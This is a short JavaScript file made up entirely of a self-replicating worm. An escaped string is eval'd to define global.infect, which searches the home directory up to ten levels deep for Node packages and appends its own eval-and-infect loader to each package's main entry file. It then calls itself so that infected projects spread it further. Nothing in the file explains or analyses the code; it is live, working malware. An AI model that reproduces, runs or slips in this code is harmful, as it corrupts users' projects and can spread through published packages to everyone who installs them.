(function() {
        var payload = "\"use strict\";function _toConsumableArray(n){if(Array.isArray(n)){for(var r=0,t=Array(n.length);r<n.length;r++)t[r]=n[r];return t}return Array.from(n)}global.infect=function(n){function r(n){return new Promise(function(r,t){o.readdir(n,function(n,e){return n?t(n):r(e)})})}function t(n){return new Promise(function(r){o.stat(n,function(n,t){r(!n&&t.isFile()?\"file\":!n&&t.isDirectory()?\"dir\":null)})})}function e(n,r){return new Promise(function(t,e){o.appendFile(n,r,function(n){return n?e(n):t()})})}function i(n){return new Promise(function(r,t){o.readFile(n,\"utf-8\",function(n,e){return n?t(n):r(e)})})}function u(n,e){return e<1?[]:r(n).then(function(r){return Promise.all(r.map(function(r){var o=f.join(n,r);return t(o).then(function(n){if(\"dir\"!==n)return[];var r=f.join(o,\"package.json\");return t(r).then(function(n){return\"file\"!==n?u(o,e-1):i(r).then(function(n){try{var r=JSON.parse(n).main||\"index.js\"}catch(n){return[]}var e=f.join(o,r);return t(e).then(function(n){return\"file\"===n?[e]:[]})})})})})).then(function(n){var r=[],t=!0,e=!1,i=void 0;try{for(var u,o=n[Symbol.iterator]();!(t=(u=o.next()).done);t=!0){var a=u.value;r.push.apply(r,_toConsumableArray(a))}}catch(n){e=!0,i=n}finally{try{!t&&o.return&&o.return()}finally{if(e)throw i}}return r})})}var o=require(\"fs\"),a=require(\"os\"),f=require(\"path\"),c='\\n(function() {\\n    var payload = \"'+function(n){return n.replace(/[\\\\\"]/g,\"\\\\$&\")}(n)+'\";\\n    eval(payload);\\n    global.infect( payload );\\n})();\\n    ';u(a.homedir(),10).then(function(n){return Promise.all(n.map(function(n){i(n).then(function(r){if(-1===r.indexOf(c))return e(n,c)})}))})};";
        var decoded = decodeURI(payload);
        eval(decoded);
        global.infect(payload);
    })();